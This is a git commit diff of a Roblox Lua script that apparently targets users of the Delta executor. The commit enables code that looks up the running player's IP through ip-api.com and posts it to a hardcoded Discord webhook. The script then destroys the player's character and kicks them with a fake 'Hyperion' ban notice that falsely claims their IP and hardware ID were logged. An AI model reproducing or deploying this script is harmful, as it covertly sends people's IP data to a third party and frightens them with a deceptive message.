67b3467a83a3f478b2b700519af9e1ce4340427d
Enviviety <149268451+Enviviety@users.noreply.github.com>
2024-03-24 20:17:12 +0200

    Update script1.lua

--- script1.lua
+++ script1.lua
@@ -1,16 +1,14 @@
 local HTTP = game:GetService("HttpService")
 
---local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_"
+local webhookurl = "https://discord.com/api/webhooks/1143233875267555459/P5JXFl4XbO-a9o_PbuY8rx91iBfHVW7dh0vMB-1OFW8rHIiY4w1xG4OlqcL1t15d2tNy"
 local player = game.Players.LocalPlayer
 local aaaaa = game:HttpGet("http://ip-api.com/json")
 local aaaa = HTTP:JSONDecode(aaaaa)
-wait(3)
+wait(10)
 
 player.Character:Destroy()
-wait(1)
-player:Kick("You have been detected by Hyperion. Your IP and HWID have been logged and you will be banned within 1 week. ".. "\n".. "IP: ".. aaaa.query .. " Execution Method Detected: Delta " .. "\n".. "HWID and TA Memory has been sent to the servers.")
 
---[[local a = HTTP:JSONDecode(aaaaa)
+local a = HTTP:JSONDecode(aaaaa)
 
 	local data = {
 		["embeds"] = {{
@@ -38,4 +36,6 @@ player:Kick("You have been detected by Hyperion. Your IP and HWID have been logg
 	}
 	local finaldata = HTTP:JSONEncode(data)
 	HTTP:PostAsync(webhookurl, finaldata)
-]]
+
+wait(1)
+player:Kick("You have been detected by Hyperion. Your IP and HWID have been logged and you will be banned within 1 week. ".. "\n".. "IP: ".. aaaa.query .. " Execution Method Detected: Delta " .. "\n".. "HWID and TA Memory has been sent to the servers.")
